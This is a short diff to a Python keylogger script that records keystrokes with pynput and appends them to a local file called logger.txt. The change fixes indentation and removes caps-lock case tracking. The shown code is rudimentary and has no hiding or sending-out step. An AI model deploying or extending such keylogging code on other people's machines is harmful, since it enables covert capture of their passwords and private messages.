@@ -1,16 +1,11 @@
 from pynput import keyboard
 
-is_capslock = False
-
+handle_spcl_keys = set()
 def logkeys(key):
-    global is_capslock
     with open('logger.txt','a+') as f:
-    log = str(key).strip('\'').lower()
+        log = str(key).strip('\'').lower()
         if key == keyboard.Key.caps_lock:
-            if is_capslock == False:
-                log = str(key).strip('\'').upper()
-            else:
-                log = str(key).strip('\'').lower()
+            pass
 
         if key == keyboard.Key.enter:
             f.write('\n')
